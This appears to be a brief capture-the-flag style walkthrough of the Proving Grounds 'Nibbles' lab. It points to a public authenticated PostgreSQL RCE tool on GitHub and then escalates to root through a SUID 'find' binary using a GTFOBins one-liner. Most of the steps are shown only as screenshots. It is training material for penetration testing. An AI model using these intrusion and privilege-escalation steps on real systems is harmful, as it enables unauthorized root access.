---
title: Nibbles
date: 2026-06-18T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - venv
  - python
  - SUID
  - PostgreSQL
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Nibbles"
---
“Fortune sides with him who dares.”  
― Virgil

![](Screenshot%202026-06-17%20at%2019.45.38.png)

![](Screenshot%202026-06-17%20at%2019.55.09.png)

![](Screenshot%202026-06-17%20at%2019.55.25.png)

Full port scan reveals a PostgreSQL port:

![](Screenshot%202026-06-18%20at%2006.27.48.png)

Once we're authenticated we can try this...

![](Screenshot%202026-06-18%20at%2006.49.56.png)

![](Screenshot%202026-06-18%20at%2007.40.39.png)

This is a rabbit hole, cost me hours.....

There is a RCE exploit on github.  
Google: Postgresql rce github authenticated shell

![](Screenshot%202026-06-19%20at%2007.59.30.png)

Clone and install dependencies:  
`git clone https://github.com/squid22/PostgreSQL_RCE`

`python3 -m venv nib`
`source /nib/bin/activate`

![](Screenshot%202026-06-19%20at%2008.02.34.png)

You'll see an error when you try to install the requirements.  
`pip3 install -r requirements.txt`

![](Screenshot%202026-06-19%20at%2008.05.33.png)

Workaround:  
`pip3 install psycopg2-binary --upgrade`

![](Screenshot%202026-06-19%20at%2008.00.48.png)

Update victim and kali IP:

![](Screenshot%202026-06-19%20at%2008.07.12.png)

![](Screenshot%202026-06-19%20at%2007.56.30.png)

`find / -perm -u=s 2>/dev/null`

![](Screenshot%202026-06-19%20at%2008.08.38.png)

`https://gtfobins.org/#//^suid$`  
If you don't know this site, get to know it.  

`find . -exec /bin/sh -p \; -quit`

![](Screenshot%202026-06-19%20at%2008.08.59.png)

The below image shows how many attempt I made.   
`find . -exec /bin/sh -p \; -quit`

![](Screenshot%202026-06-19%20at%2008.11.16.png)

😈